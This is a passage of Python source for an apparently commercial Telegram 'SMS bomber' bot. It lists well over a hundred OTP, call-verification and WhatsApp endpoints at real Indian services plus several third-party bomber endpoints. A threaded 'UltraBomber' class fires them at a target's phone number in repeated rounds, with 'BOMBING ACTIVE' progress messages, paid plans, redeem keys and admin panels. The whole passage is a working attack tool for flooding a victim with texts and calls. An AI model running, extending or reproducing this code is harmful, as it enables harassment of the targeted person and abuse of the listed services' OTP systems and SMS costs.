                  {"Content-Type": "application/json"}, '{"phone":"{phone}","city":362}'),
        ApiConfig("PokerBaazi", "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","mfa_channels":"phno"}'),
        ApiConfig("My11Circle", "https://www.my11circle.com/api/fl/auth/v3/getOtp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("Dream11_Pwdless", "https://www.dream11.com/auth/passwordless/init", "POST",
                  {"Content-Type": "application/json"}, '{"channel":"sms","flow":"SIGNUP","phoneNumber":"{phone}","templateName":"default"}'),
        ApiConfig("Unacademy_UserCheck", "https://unacademy.com/api/v3/user/user_check/", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","send_otp":true}'),
        ApiConfig("Vedantu", "https://user.vedantu.com/user/preLoginVerification", "POST",
                  {"Content-Type": "application/json"}, '{"phoneNumber":"{phone}","phoneCode":"+91"}'),
        ApiConfig("Byjus_SMS", "https://bcas-prod.byjusweb.com/api/send-otp", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "phoneNumber={phone}"),
        ApiConfig("Spinny", "https://api.spinny.com/api/c/user/otp-request/v3/", "POST",
                  {"Content-Type": "application/json"}, '{"contact_number":"{phone}","whatsapp":false,"code_len":4,"expected_action":"login"}'),
        ApiConfig("Citymall", "https://citymall.live/api/cl-user/auth/get-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone_number":"{phone}"}'),
        ApiConfig("Jobhai", "https://api.jobhai.com/auth/jobseeker/v3/send_otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("Kwikfix", "https://admin.kwikfixauto.in/api/auth/signupotp/", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("Brevistay", "https://www.brevistay.com/cst/app-api/login", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("Hourlyrooms", "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("BharatLoan", "https://www.bharatloan.com/login-sbm", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobile={phone}"),
        ApiConfig("Pagarbook", "https://api.pagarbook.com/api/v5/auth/otp/request", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","language":1}'),
        ApiConfig("Redcliffe", "https://api.redcliffelabs.com/api/v1/notification/send_otp/", "POST",
                  {"Content-Type": "application/json"}, '{"phone_number":"{phone}"}'),
        ApiConfig("Club55", "https://api.55clubapi.com/api/webapi/SmsVerifyCode", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"91{phone}","codeType":1}'),
        ApiConfig("Woodenstreet", "https://api.woodenstreet.com/api/v1/register", "POST",
                  {"Content-Type": "application/json"}, '{"telephone":"{phone}"}'),
        ApiConfig("PenPencil_Resend", "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "POST",
                  {"Content-Type": "application/json"}, '{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}'),
        ApiConfig("DaycoIndia", "https://ekyc.daycoindia.com/api/nscript_functions.php", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"),
        ApiConfig("LendingPlate", "https://lendingplate.com/api.php", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobiles={phone}&resend=Resend"),
        ApiConfig("NewMe", "https://prodapi.newme.asia/web/otp/request", "POST",
                  {"Content-Type": "application/json"}, '{"mobile_number":"{phone}","resend_otp_request":true}'),
        ApiConfig("Smytten", "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "POST",
                  {"Content-Type": "application/json", "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f"},
                  '{"phone":"{phone}","email":"sdhabai09@gmail.com"}'),
        ApiConfig("CaratLane", "https://www.caratlane.com/cg/dhevudu", "POST",
                  {"Content-Type": "application/json"},
                  '{"query":"mutation { SendOtp(input: { mobile: \\"{phone}\\", isdCode: \\"91\\", otpType: \\"registerOtp\\" }) { status { message code } } }"}'),
        ApiConfig("WellAcademy", "https://wellacademy.in/store/api/numberLoginV2", "POST",
                  {"Content-Type": "application/json"}, '{"contact_no":"{phone}"}'),
        ApiConfig("GoPink_Cabs", "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"},
                  "check_mobile_number=1&contact={phone}"),
        ApiConfig("Shemaroome", "https://www.shemaroome.com/users/resend_otp", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"},
                  "mobile_no=%2B91{phone}"),
        ApiConfig("Cossouq", "https://www.cossouq.com/mobilelogin/otp/send", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobilenumber={phone}&otptype=register"),
        ApiConfig("MyImagineStore", "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobile={phone}"),
        ApiConfig("Otpless", "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","selectedCountryCode":"+91"}'),
        ApiConfig("MyHubbleMoney", "https://api.myhubble.money/v1/auth/otp/generate", "POST",
                  {"Content-Type": "application/json"}, '{"phoneNumber":"{phone}","channel":"SMS"}'),
        ApiConfig("TataCapital_Business", "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}'),
        ApiConfig("DealShare", "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","hashCode":"k387IsBaTmn"}'),
        ApiConfig("Snapmint", "https://api.snapmint.com/v1/public/sign_up", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("Housing_com", "https://login.housing.com/api/v2/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","country_url_name":"in"}'),
        ApiConfig("RentoMojo2", "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("Netmeds2", "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("Nykaa2", "https://www.nykaa.com/app-api/index.php/customer/send_otp", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"},
                  "source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"),
        ApiConfig("Animall", "https://animall.in/zap/auth/login", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}'),
        ApiConfig("Entri2", "https://entri.app/api/v3/users/check-phone/", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("Aakash", "https://antheapi.aakash.ac.in/api/generate-lead-otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}'),
        ApiConfig("Revv2", "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","deviceType":"website"}'),
        ApiConfig("DeHaat", "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","client_id":"kisan-app"}'),
        ApiConfig("A23Games", "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}'),
        ApiConfig("Spencers", "https://jiffy.spencers.in/user/auth/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("ShoppersStop", "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}'),
        ApiConfig("LifestyleStores", "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "POST",
                  {"Content-Type": "application/json"}, '{"signInMobile":"{phone}","channel":"sms"}'),
        ApiConfig("MamaEarth", "https://auth.mamaearth.in/v1/auth/initiate-signup", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("HomeTriangle", "https://hometriangle.com/api/partner/xauth/signup/otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("WellnessForever", "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"},
                  'method=firstRegisterApi&data={"customerMobile":"{phone}","generateOtp":"true"}'),
        ApiConfig("HealthMug", "https://api.healthmug.com/account/createotp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("Kredily", "https://app.kredily.com/ws/v1/accounts/send-otp/", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("TataMotors", "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","sendOtp":"true"}'),
        ApiConfig("Moglix2", "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","buildVersion":"24.0"}'),
        ApiConfig("TrulyMadly", "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","locale":"IN"}'),
        ApiConfig("Apna2", "https://production.apna.co/api/userprofile/v1/otp/", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","hash_type":"play_store"}'),
        ApiConfig("Swipe", "https://app.getswipe.in/api/user/mobile_login", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","resend":true}'),
        ApiConfig("CountryDelight", "https://api.countrydelight.in/api/v1/customer/requestOtp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","platform":"Android","mode":"new_user"}'),
        ApiConfig("Rapido2", "https://customer.rapido.bike/api/otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("BetterHalf", "https://api.betterhalf.ai/v2/auth/otp/send/", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","isd_code":"91"}'),
        ApiConfig("NuvamaWealth", "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNo":"{phone}","emailID":"test@example.com"}'),
        ApiConfig("Mpokket", "https://web-api.mpokket.in/registration/sendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("MoreRetail", "https://omni-api.moreretail.in/api/v1/login/", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","hash_key":"XfsoCeXADQA"}'),
        ApiConfig("Charzer", "https://api.charzer.com/auth-service/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","appSource":"CHARZER_APP"}'),
        ApiConfig("BikeFixup", "https://api.bikefixup.com/api/v2/send-registration-otp", "POST",
                  {"Content-Type": "application/json", "client": "app"},
                  '{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}'),
        ApiConfig("Foxy_SMS", "https://www.foxy.in/api/v2/users/send_otp", "POST",
                  {"Content-Type": "application/json", "Platform": "web"},
                  '{"user":{"phone_number":"+91{phone}"},"via":"sms"}'),
        ApiConfig("Licious2", "https://www.licious.in/api/login/signup", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","captcha_token":null}'),
        ApiConfig("SMS_Bomber_Worker", "http://sms-bomber.subhxcosmo.workers.dev/api?num={phone}", "GET", {}, None),
        ApiConfig("Bomberrr_Vercel", "https://bomberrr.vercel.app/?key=roots&number={phone}", "GET", {}, None),
        ApiConfig("Bolbet", "https://bolbet-liart.vercel.app/?key=roots&number={phone}", "GET", {}, None),
        ApiConfig("RedBus_GET", "https://m.redbus.in/api/getOtp?number={phone}&cc=91", "GET", {}, None),
        ApiConfig("Univest_GET", "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}", "GET", {}, None),
        ApiConfig("WorkIndia", "https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623", "GET", {}, None),
        ApiConfig("Jockey_SMS", "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=false", "GET", {}, None),
        ApiConfig("Vyapar", "https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}", "GET", {}, None),
        ApiConfig("ConfirmTkt", "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}", "GET", {}, None),
        ApiConfig("CodFirm_GET", "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com", "GET", {}, None),
        ApiConfig("Coolwinks", "https://api.coolwinks.com/api/accounts/is_already_registered/?username={phone}", "GET", {}, None),
        ApiConfig("Zee5", "https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={phone}", "GET", {}, None),
        ApiConfig("MyGov", "https://auth.mygov.in/regapi/register_api_ver1/?api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={phone}&gender=male", "GET", {}, None),
        ApiConfig("AstroSage", "https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&phoneno={phone}", "GET", {}, None),
        ApiConfig("BigCash", "https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1", "GET", {}, None),
        ApiConfig("HappyEasyGo", "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{phone}", "GET", {}, None),
        ApiConfig("Cashify", "https://www.cashify.in/api/cu01/v1/app-link?mn={phone}", "GET", {}, None),
        ApiConfig("JustDial", "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile={phone}", "GET", {}, None),
        ApiConfig("Airtel_Referral", "https://www.airtel.in/referral-api/core/notify?messageId=map&rtn={phone}", "GET", {}, None),
        ApiConfig("FreeFire_Bomber", "https://freefire-api.ct.ws/bomber4.php?phone={phone}&duration=30", "GET", {}, None),
        ApiConfig("RootX_Bomber", "https://bomber-rootxindia.satyamrajsingh562.workers.dev/start?key=demo&n={phone}", "GET", {}, None),
        ApiConfig("Bombom_Worker", "https://bombom.hb3284008.workers.dev/?mobile={phone}", "GET", {}, None),
    ]
    apis.extend(sms_apis)

    # Custom admin-added APIs
    try:
        for capi in custom_api_db.get_all():
            apis.append(ApiConfig(
                capi["name"], capi["url"], capi["method"],
                capi.get("headers", {}), capi.get("body"),
                capi.get("category", "sms")
            ))
    except Exception as e:
        logger.error(f"Custom API load error: {e}")

    # CLASSX BULK APIs
    try:
        classx_configs = build_classx_api_configs()
        apis.extend(classx_configs)
        logger.info(f"✅ Loaded {len(classx_configs)} ClassX APIs")
    except Exception as e:
        logger.error(f"ClassX API build failed: {e}")

    return apis

logger.info("Loading APIs...")
ALL_APIS = get_all_apis()
CALL_APIS = [a for a in ALL_APIS if a.category == "call"]
SMS_APIS = [a for a in ALL_APIS if a.category == "sms"]
WHATSAPP_APIS = [a for a in ALL_APIS if a.category == "whatsapp"]
logger.info(f"Loaded: {len(ALL_APIS)} total | {len(CALL_APIS)} call | {len(SMS_APIS)} sms | {len(WHATSAPP_APIS)} WA")

def reload_apis():
    global ALL_APIS, CALL_APIS, SMS_APIS, WHATSAPP_APIS
    ALL_APIS = get_all_apis()
    CALL_APIS = [a for a in ALL_APIS if a.category == "call"]
    SMS_APIS = [a for a in ALL_APIS if a.category == "sms"]
    WHATSAPP_APIS = [a for a in ALL_APIS if a.category == "whatsapp"]
    logger.info(f"🔄 Reloaded: {len(ALL_APIS)} total")

# ============================================================
# IMPORTANT APIS
# ============================================================
IMPORTANT_CALL_APIS = [
    ApiConfig("Swiggy_Call", "https://profile.swiggy.com/api/v3/app/request_call_verification", "POST",
              {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
    ApiConfig("Flipkart_Call", "https://2.rome.api.flipkart.com/api/4/user/otp/generate", "POST",
              {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}"}', "call"),
]

IMPORTANT_5S_APIS = [
    ApiConfig("Bombom_Worker_5s", "https://bombom.hb3284008.workers.dev/?mobile={phone}", "GET",
              {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, None, "sms"),
]

# ============================================================
# USER DATA STORE
# ============================================================
class UserData:
    def __init__(self):
        self.users = {}
        self.lock = threading.Lock()

    def clear_phone(self, chat_id):
        with self.lock:
            if chat_id in self.users:
                self.users[chat_id]["phone"] = None
                self.users[chat_id].pop("pending_mode", None)

user_data = UserData()
admin_data = {}

# ============================================================
# WORKER
# ============================================================
class UltraBomber:
    def __init__(self):
        self.sessions = {}
        self.lock = threading.Lock()
        self.executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
        self.sms_executor = ThreadPoolExecutor(max_workers=SMS_MAX_WORKERS)
        self.http_session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=50, max_retries=2)
        self.http_session.mount('https://', adapter)
        self.http_session.mount('http://', adapter)
        self.is_stopping = False

    def _fire_api(self, api, phone):
        try:
            url, headers, body = api.build_request(phone)
            headers["Accept"] = "application/json, text/plain, */*"
            headers["Connection"] = "keep-alive"
            if api.method.upper() == "POST":
                resp = self.http_session.post(url, headers=headers, data=body, timeout=8,
                                              allow_redirects=False, verify=False)
            elif api.method.upper() == "PUT":
                resp = self.http_session.put(url, headers=headers, data=body, timeout=8,
                                             allow_redirects=False, verify=False)
            else:
                resp = self.http_session.get(url, headers=headers, timeout=8,
                                             allow_redirects=False, verify=False)
            status = resp.status_code
            size = len(resp.content)
            success = 200 <= status < 400 and size > 5
            admin_db.update_api_stats(api.name, success)
            return api.name, status, size, success, None
        except Exception as e:
            admin_db.update_api_stats(api.name, False)
            return api.name, 0, 0, False, str(e)[:60]

    def _run_round(self, phone, apis, is_sms=False):
        executor = self.sms_executor if is_sms else self.executor
        fire_count = 2 if (is_sms and SMS_DOUBLE_FIRE) else 1
        futures = []
        for api in apis:
            if api.delay_ms > 0:
                time.sleep(api.delay_ms / 1000.0)
            for _ in range(fire_count):
                futures.append(executor.submit(self._fire_api, api, phone))
        ok_count = 0
        fail_count = 0
        for f in as_completed(futures):
            try:
                name, status, size, success, err = f.result(timeout=5)
                if success:
                    ok_count += 1
                else:
                    fail_count += 1
            except Exception:
                fail_count += 1
        return ok_count, fail_count

    def _worker(self, chat_id, stop_event):
        with self.lock:
            info = self.sessions.get(chat_id)
            if not info:
                return
            phone = info["phone"]
            mode = info["mode"]

        if mode == "call":
            apis = CALL_APIS
        elif mode == "whatsapp":
            apis = WHATSAPP_APIS
        elif mode == "sms":
            apis = SMS_APIS
        else:
            apis = ALL_APIS

        round_num = 0
        is_sms_mode = (mode == "sms")
        round_delay = SMS_DELAY_BETWEEN_ROUNDS if is_sms_mode else DELAY_BETWEEN_ROUNDS

        while not stop_event.is_set() and not self.is_stopping:
            round_num += 1
            try:
                ok, fail = self._run_round(phone, apis, is_sms=is_sms_mode)
                with self.lock:
                    if chat_id in self.sessions:
                        self.sessions[chat_id]["stats"]["ok"] += ok
                        self.sessions[chat_id]["stats"]["fail"] += fail
                        self.sessions[chat_id]["stats"]["rounds"] += 1
                        self.sessions[chat_id]["stats"]["total"] += ok + fail

                if round_num % 3 == 0 and not stop_event.is_set() and not self.is_stopping:
                    try:
                        with self.lock:
                            s = dict(self.sessions.get(chat_id, {}).get("stats", {}))
                        total = s.get('total', 0)
                        ok = s.get('ok', 0)
                        pct = (ok / max(total, 1)) * 100
                        bar_len = 30
                        filled = int(bar_len * pct / 100)
                        bar = "█" * filled + "░" * (bar_len - filled)
                        stop_markup = types.InlineKeyboardMarkup()
                        stop_markup.add(types.InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bombing"))
                        bot.send_message(chat_id,
                            f"💣 *BOMBING ACTIVE* 💣\n"
                            f"────────────────────\n"
                            f"💣 Target: `{phone}`\n"
                            f"✅ Hits: {ok}/{total}\n"
                            f"📊 Progress: [{bar}] {pct:.1f}%\n"
                            f"⏱️ Rounds: {s.get('rounds', 0)}",
                            parse_mode="Markdown", reply_markup=stop_markup)
                    except Exception as e:
                        logger.error(f"Status send error: {e}")
            except Exception as e:
                logger.error(f"Worker error: {e}")
            time.sleep(round_delay)

    def _important_worker(self, chat_id, stop_event):
        with self.lock:
            info = self.sessions.get(chat_id)
            if not info:
                return
            phone = info["phone"]
        while not stop_event.is_set() and not self.is_stopping:
            try:
                futures = [self.executor.submit(self._fire_api, api, phone) for api in IMPORTANT_CALL_APIS]
                ok_count = 0
                fail_count = 0
                for f in as_completed(futures):
                    try:
                        name, status, size, success, err = f.result(timeout=5)
                        if success:
                            ok_count += 1
                        else:
                            fail_count += 1
                    except Exception:
                        fail_count += 1
                with self.lock:
                    if chat_id in self.sessions:
                        self.sessions[chat_id]["stats"]["ok"] += ok_count
                        self.sessions[chat_id]["stats"]["fail"] += fail_count
                        self.sessions[chat_id]["stats"]["total"] += ok_count + fail_count
            except Exception:
                pass
            time.sleep(IMPORTANT_CALL_INTERVAL)

    def _important_five_second_worker(self, chat_id, stop_event):
        with self.lock:
            info = self.sessions.get(chat_id)
            if not info:
                return
            phone = info["phone"]
        while not stop_event.is_set() and not self.is_stopping:
            try:
                futures = [self.executor.submit(self._fire_api, api, phone) for api in IMPORTANT_5S_APIS]
                local_ok = 0
                local_fail = 0
                for f in as_completed(futures):
                    try:
                        name, status, size, success, err = f.result(timeout=5)
                        if success:
                            local_ok += 1
                        else:
                            local_fail += 1
                    except Exception:
                        local_fail += 1
                if local_ok or local_fail:
                    with self.lock:
                        if chat_id in self.sessions:
                            self.sessions[chat_id]["stats"]["ok"] += local_ok
                            self.sessions[chat_id]["stats"]["fail"] += local_fail
                            self.sessions[chat_id]["stats"]["total"] += local_ok + local_fail
            except Exception:
                pass
            time.sleep(IMPORTANT_5S_INTERVAL)

    def start(self, chat_id, phone, mode, username=None):
        with self.lock:
            if chat_id in self.sessions:
                return False, "Already running! Pehle Stop karein."
            if chat_id not in ADMIN_IDS and not admin_db.is_admin(chat_id):
                sub = admin_db.get_subscription(chat_id)
                if not sub:
                    return False, ("❌ *No Active Plan!*\n\n"
                                   "Aapke paas koi active plan nahi hai.\n"
                                   "📋 Plans mein dekh kar key redeem karein.")
            admin_db.track_user(chat_id, username, phone, mode)
            self.is_stopping = False
            stop_event = threading.Event()
            stats = {"ok": 0, "fail": 0, "rounds": 0, "total": 0,
                     "start_time": datetime.now(), "elapsed": "0s"}
            self.sessions[chat_id] = {
                "phone": phone, "mode": mode, "stop_event": stop_event,
                "stats": stats, "thread": None, "imp_thread": None,
                "imp5s_thread": None, "user_id": chat_id, "username": username
            }
            thread = threading.Thread(target=self._worker, args=(chat_id, stop_event), daemon=True)
            thread.start()
            self.sessions[chat_id]["thread"] = thread
            if mode in ["call", "mix"]:
                imp_thread = threading.Thread(target=self._important_worker,
                                              args=(chat_id, stop_event), daemon=True)
                imp_thread.start()
                self.sessions[chat_id]["imp_thread"] = imp_thread
            imp5s_thread = threading.Thread(target=self._important_five_second_worker,
                                            args=(chat_id, stop_event), daemon=True)
            imp5s_thread.start()
            self.sessions[chat_id]["imp5s_thread"] = imp5s_thread
            try:
                stop_markup = types.InlineKeyboardMarkup()
                stop_markup.add(types.InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bombing"))
                bot.send_message(chat_id,
                    f"💣 *BOMBING ACTIVE* 💣\n"
                    f"────────────────────\n"
                    f"💣 Target: `{phone}`\n"
                    f"✅ Hits: 0/0\n"
                    f"📊 Progress: [{'░' * 30}] 0.0%\n"
                    f"🎯 Mode: *{mode.upper()}*\n"
                    f"📡 APIs: {len(ALL_APIS)}\n"
                    f"────────────────────\n"
                    f"⚡ Attack initiated...",
                    parse_mode="Markdown", reply_markup=stop_markup)
            except Exception as e:
                logger.error(f"Start message error: {e}")
            return True, f"🔥 *{mode.upper()} started for* `{phone}`"

    def stop(self, chat_id):
        with self.lock:
            if chat_id not in self.sessions:
                return False, "❌ Koi active session nahi hai."
            self.sessions[chat_id]["stop_event"].set()
            s = dict(self.sessions[chat_id]["stats"])
            start_time = s["start_time"]
            stats_snapshot = dict(s)
        time.sleep(2)
        elapsed = datetime.now() - start_time
        admin_db.update_stats(chat_id, stats_snapshot['ok'], stats_snapshot['fail'],
                              stats_snapshot['rounds'], stats_snapshot['total'])
        with self.lock:
            self.sessions.pop(chat_id, None)
        user_data.clear_phone(chat_id)
        total = stats_snapshot['total']
        ok = stats_snapshot['ok']
        pct = (ok / max(total, 1)) * 100
        bar_len = 30
        filled = int(bar_len * pct / 100)
        bar = "█" * filled + "░" * (bar_len - filled)
        return True, (f"💥 *BOMBING COMPLETE* 💥\n"
                     f"────────────────────\n"
                     f"✅ Final Hits: {ok}/{total}\n"
                     f"📊 Progress: [{bar}] {pct:.1f}%\n"
                     f"⏱️ Duration: {str(elapsed).split('.')[0]}\n"
                     f"🔄 Total Rounds: {stats_snapshot['rounds']}\n"
                     f"────────────────────\n"
                     f"🛑 Session terminated.")

    def get_status(self, chat_id):
        with self.lock:
            if chat_id not in self.sessions:
                return None
            s = self.sessions[chat_id]
            elapsed = datetime.now() - s["stats"]["start_time"]
            elapsed_str = str(elapsed).split('.')[0]
            s["stats"]["elapsed"] = elapsed_str
            return {
                "phone": s["phone"], "mode": s["mode"],
                "ok": s["stats"]["ok"], "fail": s["stats"]["fail"],
                "rounds": s["stats"]["rounds"], "total": s["stats"]["total"],
                "elapsed": elapsed_str
            }

    def stop_all(self):
        with self.lock:
            self.is_stopping = True
            ids = list(self.sessions.keys())
            for chat_id in ids:
                s = self.sessions[chat_id]["stats"]
                admin_db.update_stats(chat_id, s['ok'], s['fail'], s['rounds'], s['total'])
                self.sessions[chat_id]["stop_event"].set()
                user_data.clear_phone(chat_id)
            self.sessions.clear()
            return len(ids)

bomber = UltraBomber()

# ============================================================
# CHANNEL CHECK
# ============================================================
def is_channel_member(user_id):
    if user_id in ADMIN_IDS:
        return True
    if not CHANNEL_CHECK_ENABLED:
        return True
    try:
        member = bot.get_chat_member(REQUIRED_CHANNEL, user_id)
        status = getattr(member, "status", None)
        return status in ["member", "administrator", "creator"]
    except Exception as e:
        error_str = str(e).lower()
        if "403" in error_str or "blocked" in error_str or "forbidden" in error_str:
            logger.debug(f"403 channel check for {user_id} → not a member")
            return False
        if "400" in error_str or "member list is inaccessible" in error_str or "chat not found" in error_str:
            logger.warning(f"⚠️ Bot is NOT admin of {REQUIRED_CHANNEL}! Add bot as admin.")
            return admin_db.is_verified(user_id)
        logger.warning(f"Channel check error for {user_id}: {e} — denying by default")
        return False

# ============================================================
# KEYBOARDS
# ============================================================
def main_keyboard(user_id=None):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        types.KeyboardButton("🔥 MIX"),
        types.KeyboardButton("💥 Bulk MIX"),
        types.KeyboardButton("📞 CALL"),
        types.KeyboardButton("📱 WHATSAPP"),
        types.KeyboardButton("💬 SMS"),
        types.KeyboardButton("📊 Status"),
        types.KeyboardButton("👤 Account"),
        types.KeyboardButton("❓ Help"),
        types.KeyboardButton("📋 Plans"),
        types.KeyboardButton("🎁 Redeem"),
        types.KeyboardButton("📩 Contact Admin"),
        types.KeyboardButton("🛑 Stop"),
    ]
    if user_id and (user_id in ADMIN_IDS or admin_db.is_admin(user_id)):
        buttons.append(types.KeyboardButton("⚙️ Admin Panel"))
    markup.add(*buttons)
    return markup

def admin_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 Stats", callback_data="adm_stats"),
        types.InlineKeyboardButton("👥 Users", callback_data="adm_users"),
        types.InlineKeyboardButton("⭐ Premium List", callback_data="adm_premium_list"),
        types.InlineKeyboardButton("💰 Give Premium", callback_data="adm_premium_give"),
        types.InlineKeyboardButton("❌ Remove Premium", callback_data="adm_premium_remove"),
        types.InlineKeyboardButton("🚫 Ban User", callback_data="adm_ban"),
        types.InlineKeyboardButton("✅ Unban User", callback_data="adm_unban"),
        types.InlineKeyboardButton("🚫 Banned List", callback_data="adm_banned_list"),
        types.InlineKeyboardButton("🔑 Generate Key", callback_data="adm_genkey"),
        types.InlineKeyboardButton("📢 Broadcast", callback_data="adm_broadcast"),
        types.InlineKeyboardButton("➕ Add API", callback_data="adm_add_api"),
        types.InlineKeyboardButton("📋 List APIs", callback_data="adm_list_apis"),
        types.InlineKeyboardButton("🔍 Check API", callback_data="adm_check_api"),
        types.InlineKeyboardButton("🗑️ Remove API", callback_data="adm_remove_api"),
        types.InlineKeyboardButton("📡 API Stats", callback_data="adm_apistats"),
        types.InlineKeyboardButton("📩 Pending Contacts", callback_data="adm_pending_contacts"),
        types.InlineKeyboardButton("💬 Reply to User", callback_data="adm_reply_user"),
    )
    return markup

# ============================================================
# BOT HANDLERS
# ============================================================
@bot.message_handler(commands=['start'])
